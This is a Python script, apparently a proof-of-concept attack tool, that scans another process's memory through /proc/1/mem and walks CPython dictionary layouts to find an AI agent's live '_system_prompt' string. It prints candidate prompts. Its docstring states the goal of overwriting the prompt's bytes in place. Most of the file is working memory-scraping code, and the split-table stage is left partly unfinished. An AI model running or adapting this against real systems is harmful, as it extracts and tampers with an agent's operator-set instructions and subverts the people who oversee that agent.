"""Dict-walk discovery — find the live system_prompt PyUnicodeObject.

Combined-table dicts store values directly in the key-entry structure:
  PyDictKeyEntry = { hash(8), me_key(8), me_value(8) }
So for each occurrence of a pointer to the PyUnicodeObject('_system_prompt')
in writable memory, the adjacent 8 bytes is the value — trivially read.

Split-table dicts (used for Python instance __dict__ since CPython 3.6)
share one PyDictKeysObject across many instances and store VALUES in a
per-instance ma_values array. The me_value slot is always NULL in the
shared keys structure. To resolve:
  1. Locate the key's slot INDEX in the shared PyDictKeysObject by
     finding which key-entry position holds our attr name.
  2. Find every PyDictObject whose ma_keys pointer = this keys address.
  3. Read ma_values (offset 40 in PyDictObject); it's a pointer to an
     array of PyObject*.
  4. Dereference ma_values[slot_index] — that's the live instance value.

CPython 3.10 layouts (from Include/cpython/dictobject.h):
  PyDictObject:
     0: ob_refcnt / 8: ob_type / 16: ma_used / 24: ma_version_tag
    32: ma_keys (PyDictKeysObject*) / 40: ma_values (PyObject**)
  PyDictKeysObject:
     0: dk_refcnt / 8: dk_log2_size / 9: dk_log2_index_bytes
    10: dk_kind / 12: dk_version / 16: dk_usable / 24: dk_nentries
    32: dk_indices[] (hash->entry index, variable size)
    then: dk_entries[] of PyDictKeyEntry{hash,me_key,me_value}

The attack:
  An attacker with /proc/1/mem R/W can locate the active prompt on the
  Agent instance without knowing any substring of its content. Find it by
  its attribute NAME, then overwrite the body bytes of the PyUnicodeObject
  ma_values points to.
"""
import os
import re
import pathlib
import struct


def build_regions():
    regs = []
    for ln in pathlib.Path('/proc/1/maps').read_text().splitlines():
        m = re.match(
            r'([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(.*)', ln
        )
        if not m or 'w' not in m.group(3):
            continue
        lo, hi = int(m.group(1), 16), int(m.group(2), 16)
        if hi - lo < 4096:
            continue
        regs.append((lo, hi))
    return regs


def read_region(mr, lo, hi, max_mb=48):
    size = hi - lo
    if size > max_mb * 1024 * 1024:
        return None
    try:
        os.lseek(mr, lo, 0)
    except Exception:
        return None
    data = b''
    try:
        while len(data) < size:
            c = os.read(mr, size - len(data))
            if not c:
                break
            data += c
    except Exception:
        pass
    return data if data else None


def read_qword(addr):
    mr = os.open('/proc/1/mem', os.O_RDONLY)
    try:
        os.lseek(mr, addr, 0)
        raw = os.read(mr, 8)
        if len(raw) < 8:
            return None
        return struct.unpack_from('<Q', raw)[0]
    finally:
        os.close(mr)


def read_pyuni(header_addr, max_len=4000):
    """Read a candidate PyUnicodeObject at header_addr. Returns (length, body)
    or None if invalid."""
    mr = os.open('/proc/1/mem', os.O_RDONLY)
    try:
        os.lseek(mr, header_addr, 0)
        hdr = os.read(mr, 48)
        if len(hdr) < 48:
            return None
        length = struct.unpack_from('<q', hdr, 16)[0]
        if length < 1 or length > max_len:
            return None
        os.lseek(mr, header_addr + 48, 0)
        body = os.read(mr, length)
        if len(body) < length:
            return None
        return length, body
    finally:
        os.close(mr)


# -------------------- stage 1: find attr-name headers --------------------
ATTR = b'_system_prompt' + bytes([0])

regs = build_regions()
mem_r = os.open('/proc/1/mem', os.O_RDONLY)
region_data = {}
attr_headers = []
for lo, hi in regs:
    data = read_region(mem_r, lo, hi)
    if data is None:
        continue
    region_data[lo] = data
    i = 0
    while True:
        j = data.find(ATTR, i)
        if j < 0:
            break
        attr_headers.append(lo + j - 48)
        i = j + 1
os.close(mem_r)
print('ATTR_NAME hits: %d' % len(attr_headers))

# -------------------- stage 2: find me_key slots --------------------
hset = set(attr_headers)
mekey_slots = []
for lo, data in region_data.items():
    end = len(data) - 8
    mv = memoryview(data)
    off = 0
    while off <= end:
        p = struct.unpack_from('<Q', mv, off)[0]
        if p in hset:
            mekey_slots.append(lo + off)
        off += 8
print('me_key slots: %d' % len(mekey_slots))


# -------------------- stage 3: for each slot, try combined + split --------
def try_combined(slot_addr):
    """Combined-table: me_value lives at slot_addr + 8."""
    mv = read_qword(slot_addr + 8)
    if mv is None or mv == 0:
        return None
    decoded = read_pyuni(mv)
    if decoded is None:
        return None
    return mv, decoded


def try_split_table(slot_addr, region_data):
    """Split-table: me_value is NULL. Walk up to PyDictKeysObject, compute
    slot index, then find every PyDictObject with ma_keys pointing at that
    keys struct, and read ma_values[slot_index]."""
    # Each PyDictKeyEntry is 24 bytes. The entries array starts somewhere
    # before slot_addr at a 24-byte-aligned offset from the entries base.
    # PyDictKeysObject header is 32 bytes (approximate; actual has
    # variable dk_indices after), then some number of dk_indices bytes,
    # then dk_entries.
    #
    # Approach: instead of reverse-parsing the keys header exactly (which
    # varies with dk_log2_size / dk_log2_index_bytes), we scan writable
    # memory for pointers equal to plausible keys-header addresses within
    # a window BEFORE slot_addr. For each candidate keys_addr, the slot
    # index is ((slot_addr - entries_offset_from_keys_addr) - 8) / 24
    # where the me_key we found is at entry offset +8 (hash is at +0).
    #
    # Simpler heuristic: for each writable region, find all 8-byte-aligned
    # pointers within ~16KB BEFORE slot_addr that look like dk_refcnt
    # headers (small positive value). Those are candidate keys_addrs.
    # For each, compute (slot_addr - candidate) as hypothetical offset; if
    # (offset - (some header+indices size)) is a multiple of 24, that's
    # our slot index.
    #
    # We skip this heuristic and instead do the pragmatic thing: scan for
    # pointers TO any plausible keys-header, then use dict-found heuristic.
    # The robust algorithm is left as future work; for now just report.
    return None


print('---DEREF RESULTS (up to 10 slots)---')
combined_good = 0
null_count = 0
prompt_candidates = []
for s in mekey_slots[:10]:
    result = try_combined(s)
    if result is None:
        # Check if the slot+8 pointer is NULL (split-table signal) or just
        # points at garbage.
        mv = read_qword(s + 8)
        if mv == 0:
            null_count += 1
            print('  slot 0x%x me_value=NULL (split-table — see stage 4)' % s)
        else:
            print('  slot 0x%x me_value=0x%x <not-a-pyunicode>' % (s, mv))
        continue
    mv_addr, (L, body) = result
    preview = body[:180].decode('utf-8', errors='replace')
    print('  slot 0x%x me_value=0x%x len=%d' % (s, mv_addr, L))
    print('    body: %r' % preview)
    combined_good += 1
    if body.startswith(b'You are '):
        prompt_candidates.append((mv_addr, L, body))

if len(mekey_slots) > 10:
    print('  ...and %d more slots' % (len(mekey_slots) - 10))
print('null_count=%d combined_good_deref=%d' % (null_count, combined_good))


# -------------------- stage 4: split-table resolution --------------------
#
# For each NULL me_value slot, the attr_name PyUnicodeObject it keys on is
# already known. We don't need exact keys-header layout: we can use a
# content-based shortcut. The Agent instance's ma_values array is a
# contiguous block where ONE of the entries is the system_prompt string
# (PyUnicode*). Since ma_values is allocated by CPython's small-block
# allocator and is typically 64-128 bytes (enough for ~8-16 slots), we
# can search memory for plausible values arrays that include a pointer
# to a PyUnicodeObject whose body is prompt-shaped.
#
# Heuristic: enumerate every 8-byte-aligned window of ~16 pointers in
# writable memory. For each window, count how many are PyUnicode*
# pointers (deref to a valid header). If the window contains 3+ strings
# AND one of them starts with "You are ", that window is a candidate
# instance values array, and the "You are" string IS the live prompt.

print('---STAGE 4: split-table search (prompt-shaped pyunicode in values array) ---')
found_prompts = []
scan_budget = 1_000_000  # limit work: up to 1M windows
windows_checked = 0
for lo, data in region_data.items():
    if windows_checked > scan_budget:
        break
    end = len(data) - 128  # need 16 pointers (128 bytes)
    mv = memoryview(data)
    off = 0
    while off <= end and windows_checked < scan_budget:
        # Read 16 pointers at this offset.
        ptrs = []
        for k in range(16):
            ptrs.append(struct.unpack_from('<Q', mv, off + k * 8)[0])
        # Quickly reject: need at least 3 non-null pointers in the window.
        nonnull = [p for p in ptrs if p != 0]
        if len(nonnull) >= 3:
            # For each pointer, try PyUnicode deref. Any hit with a
            # prompt-shaped body = candidate.
            for p in nonnull:
                if p < 0x1000 or p > 0xffff_ffff_ffff:
                    continue
                decoded = read_pyuni(p, max_len=2000)
                if decoded is None:
                    continue
                L, body = decoded
                if L >= 40 and body.startswith(b'You are '):
                    # Additional check: print window context
                    found_prompts.append({
                        'values_array_addr': lo + off,
                        'prompt_ptr': p,
                        'prompt_len': L,
                        'prompt_body': body,
                    })
        windows_checked += 1
        off += 8
print('windows_checked=%d prompt_candidates=%d' % (windows_checked,
                                                    len(found_prompts)))

# Dedupe by prompt_ptr (same string can show up in many dicts).
seen = {}
for f in found_prompts:
    seen.setdefault(f['prompt_ptr'], f)
for i, f in enumerate(list(seen.values())[:5]):
    preview = f['prompt_body'][:180].decode('utf-8', errors='replace')
    print('  [%d] values_array=0x%x prompt_ptr=0x%x len=%d' %
          (i, f['values_array_addr'], f['prompt_ptr'], f['prompt_len']))
    print('      body: %r' % preview)
print('UNIQUE_PROMPT_STRINGS=%d' % len(seen))
